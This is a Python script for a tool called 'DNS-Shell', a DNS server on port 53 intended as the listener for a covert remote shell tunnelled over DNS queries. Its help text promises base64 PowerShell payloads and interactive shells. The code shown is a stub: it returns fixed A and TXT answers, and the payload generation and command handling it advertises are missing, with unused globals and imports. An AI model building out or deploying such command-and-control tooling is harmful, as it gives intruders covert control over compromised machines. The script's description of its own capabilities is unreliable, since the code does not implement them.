import argparse
import time
import traceback
import base64
import re
import sys
import binascii
import threading
import socketserver
import requests,zlib
from dnslib import *


def parse_output(req):
    global cmd
    cmd = 'NoCMD'
    request = req
    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
    rdata = A('127.0.0.1')
    TTL = 1
    rqt = rdata.__class__.__name__

    qtype = request.q.qtype
    qt = QTYPE[qtype]
    reply.add_answer(RR(rname=request.q.qname, rtype=1, rclass=1, ttl=TTL, rdata=rdata))
    return reply.pack()


def parse_newCMD(request):
    global cmd
    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
    TTL = 1
    rdata = TXT("hostname")
    rqt = rdata.__class__.__name__
    reply.add_answer(RR(rname=request.q.qname, rtype=QTYPE.TXT, rclass=1, ttl=TTL, rdata=rdata))
    return reply.pack()


def dns_response(data):
    request = DNSRecord.parse(data)
    qname = request.q.qname
    qn = str(qname)
    qtype = request.q.qtype
    qt = QTYPE[qtype]
    if qt == 'A':
        reply = parse_output(request)
    elif qt == 'TXT':
        reply = parse_newCMD(request)
    elif qt=="NS":
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
        reply.add_answer(RR(rname=qname, rtype=QTYPE.NS, rclass=1, ttl=1, rdata=NS("127.0.0.1")))
        reply = reply.pack()
    return reply


class BaseRequestHandler(socketserver.BaseRequestHandler):

    def get_data(self):
        raise NotImplementedError

    def send_data(self, data):
        raise NotImplementedError

    def handle(self):
        try:
            data = self.get_data()
            self.send_data(dns_response(data))
        except Exception:
            pass


class UDPRequestHandler(BaseRequestHandler):

    def get_data(self):
        global newConn, recvConn, client_ip
        if newConn:
            newConn = 0
            recvConn = 1
            client_ip = self.client_address
            print("[+] Recieved Connection from %s" % client_ip[0])
        return self.request[0].strip()

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)


def main(WebRequestFile=None, single=None):
    global cmd, cmds, cr, rcvtime, newCommand, recvConn, client_ip
    UDP_PORT = 53
    s = socketserver.ThreadingUDPServer(('', UDP_PORT), UDPRequestHandler)
    thread = threading.Thread(target=s.serve_forever)
    thread.daemon = True  # exit the server thread when the main thread terminates
    try:
        thread.start()
        while thread.is_alive():
            time.sleep(1)
            # sys.stdout.flush()
            # sys.stderr.flush()
    except KeyboardInterrupt:
        print("Not ok!")
    except:
        raise


if __name__ == '__main__':
    logo = '''
 ____            ____   ____            _             _ 
|  _ \ _ __  ___|___ \ / ___|___  _ __ | |_ _ __ ___ | |
| | | | '_ \/ __| __) | |   / _ \| '_ \| __| '__/ _ \| |
| |_| | | | \__ \/ __/| |__| (_) | | | | |_| | | (_) | |
|____/|_| |_|___/_____|\____\___/|_| |_|\__|_|  \___/|_|
'''
    cmds = []
    cr = []
    rcvtime = 0.0
    cmd = 'NoCMD'
    newCommand = 1
    recvConn = 0
    newConn = 1
    client_ip = None
    parser = argparse.ArgumentParser(
        description='''
A Sort of DNS-SHell.
%s
''' % logo,
        formatter_class=argparse.RawTextHelpFormatter,
        epilog='''
Examples:

# Generate base64 encoded PowerShell payload, run in listener direct queries mode and wait for interactive shell.
sudo python DNS-Shell.py -l -d [Server IP]

# Generate base64 encoded PowerShell payload, and run in listener recursive queries mode and wait for interactive shell.
sudo python DNS-Shell.py -l -r [Domain]''')
    parser.add_argument('-l', '--listen', help='Activate listener mode.', action='store_true')
    parser.add_argument('-r', '--recursive', help='Recursive DNS query requests.')
    parser.add_argument('-d', '--direct', help='Direct DNS queries mode.')
    p = parser.parse_args()
    print(logo)
    # listener direct mode
    if p.listen and p.direct:        
        main()
    # listener recursive mode
    elif p.listen and p.recursive:
        print('[+] Listener recursive queries mode active.')
        main()
    else:
        parser.print_help()
